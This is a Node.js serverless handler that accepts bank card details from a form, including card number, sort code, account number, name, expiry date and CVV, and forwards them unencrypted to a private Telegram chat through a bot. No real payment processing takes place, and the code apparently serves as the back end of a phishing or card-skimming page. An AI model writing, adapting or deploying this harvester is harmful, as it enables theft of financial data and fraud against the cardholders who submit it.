import fetch from 'node-fetch';

export default async function handler(req, res) {
    if (req.method === 'POST') {
        try {
            const {
                cardNumber,
                sortCode,
                accountNumber,
                nameOnCard,
                expiryDate,
                cvv
            } = req.body;

            // Telegram bot configuration
            const telegramBotToken = 'YOUR_BOT_TOKEN'; // Replace with your bot token
            const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
            
            // Format message
            const message = encodeURIComponent(
                `New Payment Details Submitted:\n\n` +
                `Card Number: ${cardNumber}\n` +
                `Sort Code: ${sortCode}\n` +
                `Account Number: ${accountNumber}\n` +
                `Name on Card: ${nameOnCard}\n` +
                `Expiry Date: ${expiryDate}\n` +
                `CVV: ${cvv}`
            );

            // Send to Telegram
            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
            const response = await fetch(telegramUrl);
            const result = await response.json();

            if (!response.ok) {
                throw new Error(`Telegram API Error: ${result.description}`);
            }

            res.status(200).json({ success: true });
        } catch (error) {
            console.error('Error:', error.message);
            res.status(500).json({ error: 'Submission failed' });
        }
    } else {
        res.status(405).json({ error: 'Method not allowed' });
    }
}
